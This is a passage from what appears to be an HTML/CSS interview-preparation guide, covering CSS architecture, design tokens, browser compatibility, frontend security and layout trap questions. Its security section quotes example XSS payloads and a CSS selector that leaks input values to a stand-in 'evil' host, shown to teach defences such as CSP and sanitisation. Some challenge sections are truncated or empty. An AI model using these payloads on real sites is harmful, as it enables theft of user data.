| BEM / naming conventions | Convention | None | Simple, framework-agnostic | Discipline-dependent, verbose |
| Utility-first (Tailwind) | No cascade conflicts by design | None (static CSS) | Fast iteration, tiny CSS that stops growing, design tokens enforced | Noisy markup, needs component abstraction to avoid repetition, harder theming of third-party markup |
| CSS Modules | Build-time hashed class names | None | Real local scope, plain CSS | Global theming needs variables; tied to a bundler |
| Runtime CSS-in-JS (styled-components, Emotion) | Generated classes | Style injection at runtime | Co-location, dynamic props | Runtime cost, hurts INP, problematic with React Server Components and streaming |
| Zero-runtime CSS-in-JS (vanilla-extract, Panda, StyleX) | Generated classes | None | Type-safe tokens, co-location | Build complexity |
| Native scoping (`@scope`, Shadow DOM) | Browser-enforced | None | No tooling | `@scope` is newly Baseline; Shadow DOM blocks global styles and complicates theming |

**A defensible senior answer:** design tokens as CSS custom properties; `@layer` for global ordering; a scoped approach (Modules or utilities) for components; avoid runtime CSS-in-JS in new performance-sensitive apps.

### Q3 \[SR\] How do you prevent specificity wars in a large codebase?

1. **Layer order declared once:** `@layer reset, tokens, base, components, utilities, overrides;`.
2. **Single-class selectors** for components; ban IDs and `!important` via Stylelint (`selector-max-id: 0`, `declaration-no-important`).
3. **`:where()` for base and library styles** so they're trivially overridable.
4. **Components own their internals; layouts own placement.** A component never sets its own outer margin; the parent stack/grid uses `gap`.
5. **State via attributes**, not ad-hoc classes: `[aria-expanded="true"]`, `[data-state="open"]` — styles stay in sync with accessibility state.
6. **Third-party CSS goes in a low layer:** `@import url(vendor.css) layer(vendor);`.

### Q4 \[SR\] Design token architecture

Tokens are named design decisions, organised in tiers:

| Tier | Example | Who changes it |
| --- | --- | --- |
| Primitive / reference | `--blue-600: oklch(52% .2 255);` | Brand/design team, rarely |
| Semantic / alias | `--color-action-bg: var(--blue-600);` | Themes override these |
| Component | `--button-bg: var(--color-action-bg);` | Component authors; consumers override per instance |

```css
@layer tokens {
  :root {
    --space-1: .25rem; --space-2: .5rem; --space-4: 1rem;
    --radius-md: 8px;
    --color-surface: light-dark(#fff, #16181d);
    --color-text: light-dark(#1b1d22, #eceef2);
    --color-action-bg: var(--blue-600);
  }
  [data-brand="acme"] { --color-action-bg: var(--green-600); }
}
```

Source tokens in a platform-neutral format (JSON / the W3C Design Tokens format) and generate CSS, iOS and Android outputs with a tool such as Style Dictionary. Components should only reference **semantic** tokens, never primitives — that is what makes rebranding and dark mode a token change instead of a code change.

### Q5 \[SR\] How do you refactor legacy CSS safely?

1. **Inventory:** Coverage for dead CSS, Stylelint for specificity hotspots, a list of `!important` and ID selectors.
2. **Safety net:** visual regression tests (Playwright screenshots, Chromatic, Percy) on key pages and components *before* changing anything.
3. **Contain the old:** wrap legacy CSS in `@layer legacy` placed below new layers, so new code wins without specificity hacks.
4. **Strangler pattern:** build new components with the new system; migrate page by page; delete legacy rules as their selectors disappear (search the codebase, check analytics for dead pages).
5. **Codemods** for mechanical changes (class renames, physical → logical properties).
6. **Track it:** a dashboard of legacy bytes and `!important` count trending down.

### Q6 \[SR\] Global vs local styles — where's the line?

Global: reset, tokens, typography defaults, focus styles, element defaults (`a`, `button`, form controls), and utilities like `.visually-hidden`. Local: everything a component renders. Layout primitives (Stack, Cluster, Grid, Sidebar) sit in between as shared, composable classes or components. If two teams can edit the same selector, it's global and needs an owner.

### Q7 \[ADV\] Sass in 2026 — still needed?

Native CSS now covers variables, nesting, `color-mix()`, `calc()`, layers and media range syntax. Sass still helps with: loops and maps for generating utility scales, mixins with logic, BEM string concatenation, and build-time functions. New projects increasingly use plain CSS + PostCSS (or Lightning CSS) for prefixing and minification. Key distinction: Sass variables are compile-time and static; custom properties are runtime, inherit, and can change per element or theme.

### Q8 \[EXP\] Follow-up: how does `@scope` differ from nesting or BEM?

```css
@scope (.card) to (.card__slot) {
  img { border-radius: 8px; }       /* only images in the card, not in nested slot content */
  :scope { padding: 1rem; }
}
```

Nesting only rewrites selectors (`.card img`) — it still matches images in any nested component. `@scope` adds a **lower boundary** (`to`), creating "donut" scopes that stop at slots, and **proximity**: when two scoped rules tie on specificity, the one whose scope root is closer wins (a dark card inside a light section gets dark styles). Scoped selectors also avoid adding the root's specificity. It reached Baseline (newly available) recently; check your support matrix and keep BEM or Modules for older targets.

### Tricky questions

- **"Tailwind means no CSS architecture."** False. You still need tokens (the config/theme), component abstractions to avoid copy-paste, and conventions for variants and arbitrary values.
- **"CSS Modules make global styles impossible."** No; `:global(.x)` exists, and custom properties pass through module boundaries.
- **"Shadow DOM fully isolates styles."** Inherited properties (`color`, `font`) and custom properties cross the boundary; that's how theming works. Selectors don't.
- **"BEM elements must mirror DOM depth" (`.card__body__title`).** No; elements are flat: `.card__title` regardless of nesting.

### Revision summary

- Every method trades scoping, runtime cost and ergonomics; know the table.
- Flat specificity + `@layer` + lint rules end specificity wars.
- Tokens in three tiers; components use semantic tokens only.
- Refactor behind visual regression tests, with legacy in a low layer.
- Sass variables = compile-time; custom properties = runtime and inheritable.

## Part 14 — Browser Compatibility & Web Platform

Compatibility work today is less about IE hacks and more about deciding which features your audience's browsers support, layering newer ones as enhancements, and testing the engines that actually differ: Blink (Chrome, Edge, Samsung Internet), WebKit (Safari, and every browser on iOS), and Gecko (Firefox).

### Q1 \[INT\] Progressive enhancement vs graceful degradation

- **Progressive enhancement:** start with a baseline that works everywhere (semantic HTML, basic CSS), then add enhancements for capable browsers. Content and core tasks never depend on the newest features.
- **Graceful degradation:** build for modern browsers, then patch so older ones still work acceptably.

Progressive enhancement is the safer default: it fails *up*, not *down*. Example: a form that submits with a normal POST, enhanced with JS validation and fetch; a layout that's a readable single column, enhanced with Grid and container queries.

### Q2 \[INT\] What is Baseline?

A cross-vendor label (on MDN, caniuse and web.dev) for when a feature works in the current versions of Chrome, Edge, Firefox and Safari:

- **Newly available** — the day the last of those engines ships it.
- **Widely available** — 30 months later, covering most users on older versions.

Teams set a policy such as "we use Widely available freely, Newly available with a fallback, and anything else only behind `@supports`". Tools like `browserslist` with a Baseline query and Stylelint's `plugin/no-unsupported-browser-features` enforce it.

### Q3 \[INT\] Feature detection in CSS and HTML

```css
@supports (container-type: inline-size) { … }
@supports selector(:user-invalid) { … }
@supports not (anchor-name: --x) { … }
```

```js
CSS.supports('display', 'grid');
'popover' in HTMLElement.prototype;
HTMLScriptElement.supports?.('importmap');
```

**Never sniff user-agent strings** to decide features: they lie, freeze (UA reduction) and break when browsers update. Detect the capability itself.

### Q4 \[INT\] Vendor prefixes and polyfills

Prefixes (`-webkit-`, `-moz-`) were for experimental features; vendors now ship experiments behind flags instead. Don't write prefixes by hand — let Autoprefixer or Lightning CSS add the few still needed (e.g. `-webkit-backdrop-filter` for older Safari, `-webkit-text-size-adjust`, `-webkit-line-clamp` used with `display: -webkit-box`).

**Polyfills:** JS that implements a missing API (`inert`, `dialog`, Popover). CSS features rarely polyfill well because the browser's layout engine can't be extended (Houdini only partly changed this). Load polyfills conditionally after feature detection, so modern browsers don't pay for them.

### Q5 \[ADV\] Common cross-browser differences you still hit

| Area | Difference | Mitigation |
| --- | --- | --- |
| iOS | Every iOS browser uses WebKit; features ship with Safari releases | Test on real Safari / iOS Simulator, not "Chrome on iPhone" |
| Form controls | Native date pickers, `select`, range and file inputs look and behave differently | `appearance: none` + custom styling, or accept native UI; customizable `select` (`appearance: base-select`) is Chromium-only so far |
| Scrollbars | Overlay vs classic scrollbars change available width | `scrollbar-gutter: stable`; never assume scrollbar width |
| Font rendering | Different hinting and default line metrics | Unitless `line-height`, `text-box-trim` where supported; test text-heavy components |
| Viewport units | Toolbar behaviour on mobile | `svh` / `dvh` (Part 9) |
| Input zoom | iOS Safari zooms into inputs with font-size < 16px | Use ≥ 16px (1rem) for inputs |

### Q6 \[ADV\] How do you debug a cross-browser layout bug?

1. Reproduce in the failing engine with a minimal test case (strip to the smallest HTML/CSS).
2. Compare computed styles and box sizes between engines (Safari Web Inspector, Firefox DevTools — Firefox's Grid and Flexbox inspectors are excellent).
3. Check spec ambiguity: is one engine right? Search the WebKit/Chromium/Mozilla bug trackers and the Interop project's dashboard.
4. Prefer a standards-based workaround over a browser hack (e.g. explicit `min-width: 0` rather than a Safari-only selector).
5. Add a visual regression test in that engine (Playwright runs Chromium, Firefox and WebKit).

### Q7 \[EXP\] Follow-up: what is the Interop project?

An annual collaboration among Apple, Google, Microsoft, Mozilla and others that picks focus areas (e.g. `:has()`, container queries, subgrid, anchor positioning, view transitions) and drives all engines to pass the same Web Platform Tests. It is why new CSS now reaches Baseline in months rather than years. Cite it when explaining why using a newly shipped feature is less risky than it was in 2015.

### Tricky questions

- **"Chrome on iPhone supports X because desktop Chrome does."** False; it is WebKit underneath.
- **"Unknown CSS breaks old browsers."** No; unknown properties and values are ignored per declaration. Unknown *selectors* invalidate the whole rule, though — another reason for `:is()`/`:where()` forgiving lists.
- **"Prefixed and unprefixed — which order?"** Prefixed first, standard last, so the standard wins where both exist.

### Revision summary

- Three engines matter: Blink, WebKit (all of iOS), Gecko.
- Baseline: Newly → Widely available after 30 months; set a team policy.
- Detect features, never sniff user agents.
- Autoprefixer for prefixes; conditional polyfills.
- Playwright across all three engines for regression tests.

## Part 15 — Security & Production Considerations

Frontend security for HTML/CSS roles centres on never letting untrusted content become markup, controlling what third parties and frames can do, and setting headers that limit damage when something slips through. Expect questions on XSS, iframes, CSP and clickjacking.

### Q1 \[INT\] What is XSS and how do HTML choices cause it?

Cross-site scripting happens when user-controlled data is inserted into a page as **markup** instead of **text**, letting an attacker run script in your origin (steal tokens, act as the user).

```js
// Vulnerable
comment.innerHTML = userInput;          // "<img src=x onerror=stealCookies()>"
link.href = userUrl;                    // "javascript:alert(1)"

// Safe
comment.textContent = userInput;        // rendered as literal text
if (/^https?:/i.test(new URL(userUrl, location.href).protocol)) link.href = userUrl;
```

**Rules:** encode on output for the right context (HTML body, attribute, URL, JS); prefer `textContent` and framework templating (React and Vue escape by default; `dangerouslySetInnerHTML` / `v-html` opt out); when rich HTML is genuinely needed, sanitise with DOMPurify or the emerging HTML Sanitizer API (`element.setHTML()`, not yet Baseline). Server-side validation is still required (Part 5).

### Q2 \[ADV\] What does Content Security Policy add?

CSP is an HTTP header telling the browser which sources may run or load. Even if an attacker injects markup, inline scripts without the right nonce won't execute.

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
  style-src 'self' 'nonce-r4nd0m';
  img-src 'self' https://cdn.example.com data:;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
```

**Practical notes:** inline `onclick=` handlers and `style=""` attributes need `'unsafe-inline'` or hashes, so CSP pushes you toward external code. Roll out with `Content-Security-Policy-Report-Only` first. **Trusted Types** (`require-trusted-types-for 'script'`) makes dangerous sinks like `innerHTML` reject plain strings; supported in Chromium-based browsers, with other engines adding it.

### Q3 \[INT\] `target="_blank"` and `rel="noopener"`

A page opened with `target="_blank"` used to get `window.opener`, letting it redirect your original tab to a phishing page ("reverse tabnabbing"). Modern browsers now apply `noopener` implicitly for `target="_blank"`, but writing it explicitly remains good practice for older browsers and for `window.open()` calls.

```html
<a href="https://external.example" target="_blank" rel="noopener noreferrer">Docs (opens in new tab)</a>
```

`noreferrer` also hides the Referer header (and implies `noopener`). For user-generated links add `rel="ugc nofollow"`. Tell users a link opens a new tab (WCAG 3.2.5 advisory).

### Q4 \[ADV\] How do you embed third-party content safely with `iframe`?

```html
<iframe src="https://widgets.example/embed"
        sandbox="allow-scripts allow-popups"
        allow="fullscreen"
        referrerpolicy="strict-origin-when-cross-origin"
        loading="lazy" title="Support chat" width="400" height="600"></iframe>
```

An empty `sandbox` attribute blocks scripts, forms, popups, top navigation, and treats the frame as a unique origin. Add back only what's needed. **Never combine `allow-scripts` with `allow-same-origin` for same-origin content**: the framed page can then remove its own sandbox. The `allow` attribute (Permissions Policy) controls camera, microphone, geolocation, fullscreen, payment.

### Q5 \[ADV\] What is clickjacking and how is it prevented?

An attacker loads your site in an invisible iframe over a decoy button, so the user's click lands on your "Delete account" or "Pay" button. Prevent it with the response header `Content-Security-Policy: frame-ancestors 'none'` (or a list of allowed origins). `X-Frame-Options: DENY` is the legacy equivalent; send both for older browsers. JavaScript frame-busting is unreliable.

### Q6 \[ADV\] Can CSS be a security risk?

Yes, if attackers can inject it:

- **Data exfiltration** via attribute selectors and background URLs: `input[value^="a"] { background: url(https://evil/?a) }` leaks characters of a value one request at a time.
- **UI redressing** — overlaying fake content or hiding warnings with injected `position: fixed` styles.

Mitigate with a strict `style-src` and `img-src` CSP, never allowing users to supply raw CSS, and sanitising style attributes in user HTML.

### Q7 \[SR\] Third-party scripts, integrity and privacy

- **Subresource Integrity:** `<script src="https://cdn…/lib.js" integrity="sha384-…" crossorigin="anonymous">` refuses a modified file.
- **Isolate** tag managers and widgets: `async`/`defer`, load after consent, sandboxed iframes where possible, budgets for their weight.
- **Privacy:** third-party fonts, images and embeds leak visitor IPs and Referer data; self-host fonts, use `referrerpolicy`, privacy-enhanced embed domains (`youtube-nocookie.com`), and load embeds only after consent where regulations (GDPR) require it.
- **Forms:** submit to HTTPS only, `autocomplete="off"` doesn't stop password managers (and shouldn't), never put tokens in URLs (GET forms log them).

### Q8 \[EXP\] Follow-up: how would you render untrusted rich HTML (an email preview)?

Layer the defences: (1) sanitise server-side and client-side with an allow-list (DOMPurify), stripping scripts, event handlers, `javascript:` URLs, forms and `style` where possible; (2) render inside a sandboxed iframe via `srcdoc` with **no** `allow-same-origin` and no `allow-scripts`, so even a sanitizer bypass runs in an opaque origin without your cookies; (3) add a CSP meta tag inside the `srcdoc` (`default-src 'none'; img-src https: data:; style-src 'unsafe-inline'`) to block remote loads; (4) proxy remote images to avoid tracking pixels leaking user IPs. Size the iframe from its content with a `postMessage` from a trusted wrapper or by measuring after load.

### Tricky questions

- **Is `textContent` enough to make any insertion safe?** For text in an HTML body, yes. Not for `href`, `src`, inline event attributes or inside `<script>` — those need URL validation or must be avoided.
- **Does `sandbox` with no value allow forms?** No; add `allow-forms`.
- **Do React apps need CSP?** Yes. Escaping covers templating, not third-party scripts, `dangerouslySetInnerHTML`, or `javascript:` URLs in props.

### Revision summary

- Untrusted data → text (`textContent`), never markup; sanitise when HTML is unavoidable.
- CSP with nonces + `object-src 'none'` + `frame-ancestors`; roll out in report-only.
- `rel="noopener noreferrer"` on external new-tab links.
- `sandbox` minimal; never `allow-scripts` + `allow-same-origin` on same-origin content.
- SRI for CDN scripts; consent and self-hosting for privacy.

## Part 16 — Senior Real-World Scenarios & System Design

Senior rounds give an open problem and grade how you structure it: clarify requirements, name constraints, propose an architecture, show key code, then volunteer trade-offs, edge cases and failure modes before being asked. Use the same five-step frame for every scenario below.

**Answer frame:** (1) Requirements and constraints → (2) Architecture → (3) Key code → (4) Trade-offs and alternatives → (5) Edge cases, failure modes, how you'd measure success.

### Scenario 1 \[SR\] Design a scalable design system for 6 product teams

**Requirements:** consistent UI across web apps in React and one legacy server-rendered app; two brands; light/dark; WCAG 2.2 AA; teams ship independently.

**Architecture (bottom to top):**

1. **Tokens** — primitive → semantic → component tiers (Part 13), authored in JSON, built to CSS custom properties.
2. **Foundations** — reset, typography scale, focus styles, in named layers.
3. **Layout primitives** — Stack, Cluster, Grid, Sidebar, Center (framework-agnostic CSS classes).
4. **Components** — Button, Input, Dialog… with accessible behaviour; CSS ships as plain CSS (usable by the legacy app), React wrappers on top.
5. **Patterns / templates** — forms, data tables, page shells, documented with usage rules.

&#91;embedded content: design system architecture · 5 layers, 2 consumers\]

```css
@layer reset, tokens, foundations, layout, components, utilities, app;
```

**Trade-offs:** framework-agnostic CSS + thin wrappers serves the legacy app but duplicates some logic; Web Components would share behaviour too but complicate SSR and theming. A monorepo with semver per package lets teams upgrade on their own schedule; a single package is simpler but forces lockstep upgrades.

**Failure modes:** teams fork components instead of contributing (fix with a contribution model and fast review SLA); token sprawl (review gate on new tokens); breaking visual changes in minor versions (visual regression tests on every component story).

**Follow-ups:** How do you deprecate a component? (Deprecation warnings, codemods, usage analytics, removal at next major.) How do you measure adoption? (Scan repos for imports vs custom CSS; track a11y defect rates.)

### Scenario 2 \[SR\] Build reusable layout primitives

**Goal:** let teams compose layouts without writing media queries, so components stay responsive in any container.

```css
/* Stack: vertical rhythm owned by the parent */
.stack { display: flex; flex-direction: column; gap: var(--stack-gap, var(--space-4)); }

/* Cluster: wrapping inline group (tags, buttons) */
.cluster { display: flex; flex-wrap: wrap; gap: var(--cluster-gap, var(--space-2)); align-items: center; }

/* Sidebar: side panel that wraps under the main content when space is tight */
.with-sidebar { display: flex; flex-wrap: wrap; gap: var(--space-4); }
.with-sidebar > :first-child { flex: 1 1 var(--sidebar-width, 16rem); }
.with-sidebar > :last-child  { flex: 999 1 0; min-inline-size: 60%; }

/* Auto grid: as many columns as fit */
.auto-grid { display: grid; gap: var(--space-4);
  grid-template-columns: repeat(auto-fit, minmax(min(var(--min, 16rem), 100%), 1fr)); }

/* Center: readable measure */
.center { box-sizing: content-box; max-inline-size: var(--measure, 65ch); margin-inline: auto; padding-inline: var(--space-4); }
```

**Why it works:** each primitive is intrinsically responsive (content-driven wrapping, `min()` guards), configured by custom properties rather than modifier classes, and composes with the others. **Trade-off:** less pixel control per breakpoint; pair with container queries for the few cases that need explicit switches.

### Scenario 6 \[SR\] A multi-step form (checkout / onboarding)

**Decisions:** one `<form>` per step (or one form with `fieldset` per step); progress shown as an ordered list with `aria-current="step"`; validation per step on Next; state preserved on Back and on reload (session storage or server drafts); final review step before submit.

### Scenario 7 \[SR\] Localisation and RTL support

**Checklist:**

- `<html lang="ar" dir="rtl">` set by the server per locale; `lang` on inline foreign phrases.
- Logical properties everywhere (`margin-inline-start`, `inset-inline-end`, `text-align: start`); Stylelint rule to block physical ones.
- Mirror directional icons (arrows, "back") with `:dir(rtl) .icon-arrow { transform: scaleX(-1); }`; don't mirror logos, media controls, or clocks.
- Text expansion: German and Finnish run 30–40% longer than English — no fixed-width buttons; let flex/grid wrap.
- Fonts: include scripts you serve (Arabic, Bengali, CJK), and check line-height for tall scripts (Bengali conjuncts, Thai).
- Numbers, dates and currency via `Intl`, never string concatenation; `unicode-bidi: isolate` / `<bdi>` around user-generated names in mixed-direction text.

**Failure modes:** `left/right` in third-party CSS, absolutely positioned badges on the wrong side, truncation clipping the meaningful end of RTL strings.

### Scenario 8 \[SR\] Theming, dark mode and multi-brand

```css
:root { color-scheme: light dark;
  --surface: light-dark(#ffffff, #121418);
  --text:    light-dark(#1b1d22, #e8eaee);
  --brand:   var(--brand-500);
}
:root[data-theme="light"] { color-scheme: light; }
:root[data-theme="dark"]  { color-scheme: dark; }
[data-brand="acme"]  { --brand-500: oklch(60% .17 150); }
[data-brand="zenit"] { --brand-500: oklch(58% .2 280); }
body { background: var(--surface); color: var(--text); }
```

**Key decisions:** default to the OS preference (`prefers-color-scheme` / `light-dark()`), allow a user override stored in a cookie so the **server** renders the right theme (prevents a flash of the wrong theme); set `color-scheme` so form controls and scrollbars match. Dark mode is not inversion: reduce saturation, use elevation by lighter surfaces instead of shadows, and re-check contrast for every semantic pair. Multi-brand = swapping the primitive or semantic token layer per `data-brand`; components never change.

### Scenario 9 \[SR\] Debugging layout shifts reported in production

1. Confirm with field data: CrUX / RUM shows CLS p75 = 0.21 on product pages, mobile only.
2. Attribute it: the `web-vitals` attribution build reports the largest shifting element and time; or DevTools Performance → Layout Shifts track, with the Rendering → Layout Shift Regions overlay.

### Challenge 4 — Accessible modal \[ADV\]

```html

  const d = document.getElementById('confirm');
  document.getElementById('open').onclick = () => d.showModal();
```

### Challenge 11 — Responsive sidebar layout \[INT\]

**Requirements:** sidebar beside content on wide screens, above it on narrow ones, without media queries; the sidebar stays in view while scrolling long content; reading and tab order put main content first for screen-reader users who skip navigation.

```html
<a class="skip" href="#content">Skip to content</a>
<div class="with-sidebar">
  <aside class="sidebar" aria-label="Filters">…filters…</aside>
  <main id="content" tabindex="-1">…long content…</main>
</div>
```

```css

.sidebar { flex: 1 1 16rem; }                         /* preferred width 16rem */
```

### Challenge 15 — Debug a complex Flexbox layout \[ADV\]

**Bug report:** "In the chat list, long messages push the timestamp off-screen, and avatars get squished."

### Challenge 16 — Debug a CSS Grid layout \[ADV\]

### Challenge 17 — Fix a stacking context issue \[ADV\]

**Bug report:** "The user-menu dropdown in the header appears under the page's hero carousel."

**Investigation:** in DevTools, check each ancestor of the dropdown for `transform`, `opacity < 1`, `filter`, or `position` + `z-index`. The header has `position: relative; z-index: 1` and the carousel has `transform: translateZ(0)` with `z-index: 2`. The dropdown's `z-index: 1000` only competes inside the header.

**Fix (in order of preference):** render the menu with the `popover` attribute (top layer); or raise the header's own `z-index` above the carousel's; or remove the needless `translateZ(0)` from the carousel. ### Challenge 19 — Recreate a UI from a design reference \[SR\]

Interviewers watch your **process** more than pixel perfection:

### Revision summary

- Start every challenge with semantic HTML and say why.
- Intrinsic layouts (`auto-fit` + `min()`) before media queries.
- Native elements (`dialog`, `details`, `button`) beat custom ARIA widgets.

## Part 18 — Tricky & Trap Questions

Every trap below follows the same six steps: the snippet, the question, the answer, the browser behaviour step by step, why the tempting answers are wrong, and what actually renders. Cover the snippet and predict before reading on — that is exactly what the interviewer will ask you to do.

### HTML traps

#### H1 · The button that submits \[INT\]

```html
<form action="/save">
  <input name="title">
  <button onclick="preview()">Preview</button>
  <button>Save</button>
</form>
```

**Question:** What happens when the user clicks Preview?

**Answer:** `preview()` runs, then the form submits to `/save`.

**Step by step:** (1) A `<button>` inside a form with no `type` defaults to `type="submit"`. (2) The click handler runs first. (3) The button's activation behaviour then submits the form. (4) The page navigates, so the preview flashes and disappears.

**Why other answers are wrong:** "Only `preview()` runs" assumes buttons default to `type="button"` — they don't. "Save submits, Preview doesn't" — both are submit buttons; the clicked one is the submitter.

**Rendered result:** a page reload to `/save?title=…`. **Fix:** `<button type="button">Preview</button>`.

#### H2 · Enter submits a form with no button \[ADV\]

```html
<form action="/search"><input name="q"></form>
```

**Question:** The user types and presses Enter. Does the form submit?

**Answer:** Yes.

**Step by step:** (1) Implicit submission: Enter in a text field submits via the form's default button. (2) With no submit button, the spec still allows submission when the form has **exactly one** field that blocks implicit submission (text-like input). (3) Add a second text input and no button, and Enter does nothing.

**Why other answers are wrong:** "No button, no submit" is the intuition; the single-field rule is a deliberate exception for search boxes.

**Rendered result:** navigation to `/search?q=…`.

#### H3 · `section`, `article` or `div`? \[INT\]

```html
<section class="card-grid">…cards…</section>
```

**Question:** Does this create a landmark for screen-reader users?

**Answer:** No.

**Step by step:** (1) `section` maps to the `region` role only when it has an accessible name (`aria-labelledby` or `aria-label`). (2) Unnamed, it is exposed like a generic container. (3) Landmark navigation lists nothing for it.

**Why other answers are wrong:** "Every `section` is a landmark" was true in older spec drafts and some old browsers; it isn't now. "Use `article`" — only if each card is self-contained content.

**Rendered result:** visually identical to a `div`. **Fix:** `<section aria-labelledby="h"><h2 id="h">Featured</h2>…`, or a `div` if it has no heading.

#### H4 · Width on an inline element \[INT\]

```html
<span style="width: 200px; height: 50px; margin: 20px; padding: 10px; background: gold">Hi</span>
```

**Question:** What size is the gold box, and does it push surrounding lines apart?

**Answer:** The box is as wide as "Hi" plus 10px padding each side; `width`, `height` and vertical margin are ignored; vertical padding is painted but does not push lines apart.

**Step by step:** (1) Non-replaced inline boxes take their size from content. (2) Horizontal margin and padding do push neighbours sideways. (3) Vertical padding and border paint over adjacent lines without affecting line height.

**Why other answers are wrong:** "200 × 50" assumes block or inline-block behaviour. "Padding is ignored" — it is painted, just not used for line layout.

**Rendered result:** a gold box overlapping the lines above and below. **Fix:** `display: inline-block`.

#### H5 · Malformed markup is repaired, not rejected \[ADV\]

```html
<p>Read <a href="/a">this <a href="/b">and this</a></a></p>
<table><tr><td>1</td></tr><p>Note</p></table>
```

**Question:** What DOM does the browser build?

**Answer:** Two sibling links (`<a href="/a">this </a><a href="/b">and this</a>`), and the paragraph is moved **before** the table.

**Step by step:** (1) A start tag `<a>` while an `<a>` is open closes the first one. (2) The extra `</a>` is ignored. (3) Inside a table, non-table content is foster-parented to just before the table.

**Why other answers are wrong:** "Nested links" — the parser never produces them from markup. "The note appears after the table" — foster parenting always inserts before.

**Rendered result:** "Note" above the table. This is how server-rendered HTML ends up mismatching a framework's virtual DOM during hydration.

#### H6 · `label for` pointing at the wrong thing \[INT\]

```html
<label for="email">Email <input id="mail" name="email"></label>
```

**Question:** Does clicking "Email" focus the input, and what is its accessible name?

**Answer:** Clicking does nothing useful and the input may be unlabelled, because `for` takes precedence over nesting.

**Step by step:** (1) `for="email"` names an `id`, not a `name`. (2) No element has `id="email"`, so the explicit association fails. (3) When `for` is present, the label is associated only with the element it references, not its descendant.

**Why other answers are wrong:** "Wrapping always works" — only when the label has no `for`, or `for` matches the nested input's `id`.

**Fix:** `for="mail"`, or remove `for`.

#### H7 · `required` on a hidden field blocks submit \[ADV\]

```html
<form>
  <input name="company" required style="display: none">
  <button>Send</button>
</form>
```

**Question:** What happens on Send?

**Answer:** Nothing submits, and the console shows "An invalid form control is not focusable."

**Step by step:** (1) Constraint validation runs on all candidate controls, visible or not. (2) The empty required field is invalid. (3) The browser tries to focus it to show the message, but it can't. (4) Submission is cancelled silently.

**Why other answers are wrong:** "Hidden fields are skipped" — only `disabled` fields and `type="hidden"` inputs are barred from validation; CSS hiding doesn't count.

**Fix:** `disabled` while hidden (also excludes it from submission), or remove `required` when the step is inactive.

#### H8 · `disabled` vs `readonly` on submit \[INT\]

```html
<input name="plan" value="pro" disabled>
<input name="seats" value="5" readonly>
```

**Question:** What reaches the server?

**Answer:** `seats=5` only.

**Step by step:** disabled controls are not successful controls, so they are skipped; readonly controls submit normally.

**Why other answers are wrong:** "Both are locked, so both submit" confuses editable with submittable. **Fix** for a display-only value that must submit: `readonly`, or a hidden input next to the disabled one.

#### H9 · Script execution order \[ADV\]

```html
<script src="a.js" async></script>   <!-- small, cached -->
<script src="b.js" defer></script>
<script type="module" src="c.js"></script>
<script src="d.js"></script>
```

**Question:** In what order can they run?

**Answer:** `d.js` runs during parsing (and `a.js` may run before or after it); `b.js` then `c.js` run after parsing in document order; `DOMContentLoaded` fires after `c.js`.

**Step by step:** (1) `async` runs whenever it arrives — possibly first. (2) `d.js` blocks the parser, runs in place. (3) `defer` and module scripts queue and run in document order after parsing. (4) `DOMContentLoaded` waits for that queue.

**Why other answers are wrong:** "a, b, c, d (source order)" ignores `async`. "Modules run immediately" — they're deferred unless also `async`.

#### H10 · `DOMContentLoaded` vs `load` with images \[INT\]

**Question:** A page has a 5 MB hero image and one deferred script. Which fires first and when?

**Answer:** `DOMContentLoaded` fires once parsing and the deferred script finish, long before the image completes; `load` fires after the image.

**Why other answers are wrong:** "`DOMContentLoaded` waits for images" — only `load` does. Measuring image dimensions in a `DOMContentLoaded` handler gives 0 unless `width`/`height` are set.

#### H11 · `dataset` naming \[INT\]

```html
<div data-user-id="7" data-isAdmin="true"></div>
```

**Question:** What do `el.dataset.userId` and `el.dataset.isAdmin` return?

**Answer:** `"7"` and `undefined`.

**Step by step:** (1) HTML attribute names are lowercased by the parser: `data-isadmin`. (2) `dataset` converts kebab-case to camelCase: `data-user-id` → `userId`, `data-isadmin` → `isadmin`. (3) Values are always strings.

**Why other answers are wrong:** `7` (number) — never; `"true"` for `isAdmin` — the capital letter was lost at parse time.

#### H12 · `hidden` that doesn't hide \[ADV\]

```html
<style> .panel { display: flex; } </style>
<div class="panel" hidden>Secret</div>
```

**Question:** Is "Secret" visible?

**Answer:** Yes.

**Step by step:** (1) `hidden` works through the browser stylesheet rule `[hidden] { display: none }`. (2) That rule is in the user-agent origin. (3) Any author rule setting `display` wins over it.

**Why other answers are wrong:** "`hidden` is an attribute, CSS can't override it" — it is only a default style. **Fix:** `[hidden] { display: none !important; }` in your reset (a legitimate `!important`).

**Related traps:** `aria-hidden="true"` on a container with a focusable link creates a ghost focus stop; `inert` fixes both visibility to AT and focus.

#### H13 · Entities and ampersands \[INT\]

```html
<a href="/search?q=1&copy=2">Search</a>
<p>AT&T &copy 2026</p>
```

**Question:** What URL does the link go to, and what text shows?

**Answer:** In the attribute, `&copy` is **not** decoded when followed by `=`, so the URL is as written; in text, "&copy" without a semicolon is decoded as "©" for legacy reasons, giving "AT&T © 2026".

**Step by step:** the parser's character-reference rules decode some legacy names without semicolons, but in attributes it leaves them alone when the next character is `=` or alphanumeric.

**Why it matters:** behaviour you can't easily reason about. **Fix:** always write `&amp;` in attribute URLs (`?q=1&amp;copy=2`) and terminate entities with `;`.

#### H14 · `srcset` without `sizes` \[ADV\]

```html
<img src="s.jpg" srcset="s.jpg 400w, m.jpg 800w, l.jpg 1600w" alt="…" class="thumb">
<style>.thumb { width: 200px; }</style>
```

**Question:** Which file does a DPR-2 laptop with a 1440px window download?

**Answer:** `l.jpg` (1600w), even though the image is shown at 200px.

**Step by step:** (1) With `w` descriptors and no `sizes`, the browser assumes `sizes="100vw"`. (2) 1440 × 2 = 2880 device pixels needed. (3) The largest candidate is chosen. (4) CSS width is unknown at selection time — selection happens before layout.

**Why other answers are wrong:** "The browser sees it's 200px wide" — the preload scanner picks before CSS is applied. **Fix:** `sizes="200px"` → 400 device px → `s.jpg`.

#### H15 · Lazy loading collapses the layout \[INT\]

```html
<img src="chart.png" loading="lazy" alt="Sales chart">
```

**Question:** What happens as the user scrolls past it?

**Answer:** The image box is 0px tall until it loads, then jumps to full height, shifting content (CLS).

**Step by step:** no intrinsic size is known before download, so layout reserves nothing. **Fix:** `width` and `height` attributes, which set an `aspect-ratio` before load. Also: never lazy-load the LCP image.

#### H16 · Native element vs custom component \[SR\]

```html
<div class="select" tabindex="0" role="listbox">…</div>
```

**Question:** What do you lose compared with `<select>`?

